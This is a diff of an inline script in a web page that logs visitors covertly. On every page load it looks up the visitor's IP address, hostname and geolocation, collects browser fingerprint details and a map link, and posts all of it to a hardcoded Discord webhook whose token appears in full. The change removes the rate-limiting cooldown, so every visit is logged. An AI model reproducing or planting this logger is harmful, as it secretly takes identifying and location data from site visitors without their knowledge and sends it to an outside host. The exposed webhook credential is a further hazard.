@@ -5694,16 +5694,15 @@
 <script>
 (() => {
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1361602825569828864/acch8V7JNP2FArWaS_BD-GusroTFDZYEAcvQhzQHFrScmHErp2mE3CjVonAcEADtLmgn";
-  const BLOCKED_IP_PREFIXES = ["", "", ""];
-  const LOG_COOLDOWN_MS = 1000; // 15 seconds cooldown
+  const BLOCKED_IP_PREFIXES = ["", "10", ""]; 
 
-  // Check if IP prefix is blocked
+  // Check if IP prefix is blocked  
   function isBlockedIP(ip) {
     if (!ip) return true;
     const prefix = ip.split(".")[0];
     return BLOCKED_IP_PREFIXES.includes(prefix);
-  }
-
+  }  
+ 
   // Add field only if value is non-empty, trimming whitespace
   function addField(fields, name, value, inline = true) {
     if (value !== undefined && value !== null) {
@@ -5737,34 +5736,8 @@
     });
   }
 
-  // Check cooldown from localStorage
-  function canLog() {
-    try {
-      const lastLog = localStorage.getItem("visitorLogLastTime");
-      if (!lastLog) return true;
-      const lastLogTime = parseInt(lastLog, 10);
-      return Date.now() - lastLogTime >= LOG_COOLDOWN_MS;
-    } catch {
-      return true; // in case localStorage is unavailable
-    }
-  }
-
-  // Update last log time in localStorage
-  function updateLastLogTime() {
-    try {
-      localStorage.setItem("visitorLogLastTime", Date.now().toString());
-    } catch {
-      // ignore errors
-    }
-  }
-
   // Main async function on page load
   async function logVisitor() {
-    if (!canLog()) {
-      console.log("Cooldown active - skipping log.");
-      return;
-    }
-
     try {
       const response = await fetch("https://ipwho.is/");
       const data = await response.json();
@@ -5781,6 +5754,7 @@
 
       const fingerprint = getFingerprintInfo();
 
+      // Build fields array with all info
       const fields = [];
       addField(fields, "IP Address", data.ip);
       addField(fields, "Hostname", data.hostname);
@@ -5808,16 +5782,17 @@
       addField(fields, "Device Memory (GB)", fingerprint.deviceMemory);
       addField(fields, "Referrer", document.referrer || "N/A");
 
+      // Add Google Maps link if lat/lon available
       if (data.latitude && data.longitude) {
         const mapUrl = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
         addField(fields, "Location Map", `[View on Google Maps](${mapUrl})`, false);
       }
 
       const embed = {
-        title: "🕵️‍♂️ New Visitor Logged",
+        title: "New Visitor Logged",
         color: 0xd14527,
         thumbnail: {
-          url: "https://cdn.discordapp.com/attachments/1361546202273026234/1363582816066998522/3dgifmaker23822.gif",
+          url: "https://files.catbox.moe/t20bv8.png", 
         },
         fields,
         footer: {
@@ -5838,7 +5813,6 @@
         console.error("Failed to send webhook:", webhookResponse.statusText);
       } else {
         console.log("Visitor logged successfully.");
-        updateLastLogTime();
       }
     } catch (error) {
       console.error("Error logging visitor:", error);
